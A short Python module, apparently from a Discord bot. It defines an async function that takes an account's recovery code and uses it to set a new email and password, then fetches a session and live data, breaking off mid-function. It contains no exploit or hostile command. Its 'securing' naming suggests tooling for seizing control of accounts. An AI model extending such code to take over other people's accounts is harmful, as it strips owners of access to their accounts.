from discord import Embed
import httpx

from views.utils.securing.getLiveData import getLiveData
from views.utils.initialSession import getSession
from views.utils.securing.recovery import recover

async def recoveryCodeFullSecure(email: str, recoveryCode: str, new_email: str, new_password: str, email_token: str) -> Embed | None:

    # Semi secure
    newRecv = await recover(
        email,
        recoveryCode,
        new_email,
        new_password,
        email_token
    )

    if not newRecv:
        return None
    
    session = getSession()
    
    liveData = getLiveData(session)
